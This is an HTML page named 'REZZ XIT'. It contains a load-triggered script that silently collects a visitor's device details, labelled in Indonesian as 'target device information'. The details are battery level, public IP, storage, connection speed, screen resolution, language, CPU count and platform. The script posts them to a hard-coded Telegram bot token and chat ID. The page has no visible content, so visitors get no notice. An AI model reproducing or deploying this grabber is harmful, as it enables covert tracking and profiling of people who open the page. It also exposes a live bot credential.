<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>REZZ XIT</title>
</head>
<body>
<script>
(async () => {
  const waktu = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });

  const battery = await navigator.getBattery();
  const baterai = Math.round(battery.level * 100) + "%";
  const charging = battery.charging ? "YA" : "TIDAK";

  const ip = await fetch("https://api.ipify.org?format=json")
    .then(r => r.json())
    .then(d => d.ip);

  const storage = navigator.storage && navigator.storage.estimate ? await navigator.storage.estimate() : {};
  const used = storage.usage ? (storage.usage / 1024 / 1024).toFixed(1) : "0.0";
  const total = storage.quota ? (storage.quota / 1024 / 1024).toFixed(1) : "0.0";

  const koneksi = navigator.connection?.effectiveType?.toUpperCase() || "?";
  const downlink = navigator.connection?.downlink?.toFixed(2) + " MBPS" || "?";
  const latensi = navigator.connection?.rtt + " MS" || "?";

  const resolusi = `${screen.width}x${screen.height}, DPR: ${window.devicePixelRatio.toFixed(2)}`;
  const bahasa = navigator.language || "?";
  const cpu = navigator.hardwareConcurrency || "?";
  const cookie = navigator.cookieEnabled ? "AKTIF" : "TIDAK";

  const teks = `
<b>_________𝗥𝗘𝗭𝗭 𝗫𝗜𝗧𝗘𝗥𝗭_________</b>

<b>𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗦𝗜 𝗣𝗘𝗥𝗔𝗡𝗚𝗞𝗔𝗧 𝗧𝗔𝗥𝗚𝗘𝗧😈</b>
══════════════════════
🔋 <b>𝘽𝘼𝙏𝙍𝙀 𝙃𝙋</b>     : <b>${baterai}</b>
══════════════════════
⚡ <b>𝘾𝙃𝘼𝙍𝙂𝙄𝙉𝙂</b>    : <b>${charging}</b>
══════════════════════
⏰ <b>𝙒𝘼𝙆𝙏𝙐</b>       : <b>${waktu} WIB</b>
══════════════════════
📍 <b>𝙇𝙊𝙆𝘼𝙎𝙄</b>      : <b>TIDAK DIAKSES</b>
══════════════════════
💾 <b>𝙎𝙏𝙊𝙍𝘼𝙂𝙀 𝙃𝙋</b>     : <b>${used}MB / ${total}MB</b>
══════════════════════
🌐 <b>𝙆𝙊𝙉𝙀𝙆𝙎𝙄</b>     : <b>${koneksi}</b>
══════════════════════
📡 <b>𝘿𝙒𝙊𝙉𝙇𝙄𝙉𝙆</b>    : <b>${downlink}</b>
══════════════════════
⏱️ <b>𝙇𝘼𝙏𝙀𝙉𝙎𝙄</b>     : <b>${latensi}</b>
══════════════════════
🌍 <b>𝙄𝙋 𝙋𝙐𝘽𝙇𝙄𝘾</b>   : <b>${ip}</b>
══════════════════════
🖥️ <b>𝙍𝙀𝙎𝙊𝙇𝙐𝙎𝙄 𝙃𝙋</b>    : <b>${resolusi}</b>
══════════════════════
🌐 <b>𝘽𝘼𝙃𝘼𝙎𝘼 𝙃𝙋</b>      : <b>${bahasa}</b>
══════════════════════
🔥 <b>𝘾𝙋𝙐 𝙏𝙃𝙍𝙀𝘼𝘿</b>  : <b>${cpu}</b>
══════════════════════
💥 <b>𝘾𝙊𝙆𝙄𝙀</b>      : <b>${cookie}</b>
══════════════════════
📋 <b>𝘾𝙇𝙄𝙋𝘽𝙊𝘼𝙍𝘿</b>   : <b>❌</b>
══════════════════════
📲 <b>𝙋𝙇𝘼𝙏𝙁𝙊𝙍𝙈</b>    : <b>${navigator.platform}</b>
══════════════════════

<b>/𝙍𝙀𝙕𝙕 𝘼𝙓𝙏𝙃</b>
<b>/𝙍𝙀𝙕𝙕 𝘼𝙓𝙏𝙕</b>
<b>/𝙍𝙀𝙕𝙕 𝘼𝙓𝙏𝙑</b>
<b>/𝙍𝙀𝙕𝙕 𝘼𝙓𝙑𝙕</b>
<b>/𝙍𝙀𝙕𝙕 𝘼𝙓𝙍𝙕</b>

<b>𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥 𝗥𝗘𝗭𝗭 𝗫𝗜𝗧𝗘𝗥𝗭 𝗩𝗜𝗣</b>
══════════════════════`;

  // Kirim ke Bot Telegram
  fetch("https://api.telegram.org/bot7636452500:AAGZgLUeKAGLjq0IlvfB-sNb_JE48fsKK90/sendMessage", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({
      chat_id: "8122699796",
      text: teks,
      parse_mode: "HTML"
    })
  });
})();
</script>
</body>
</html>
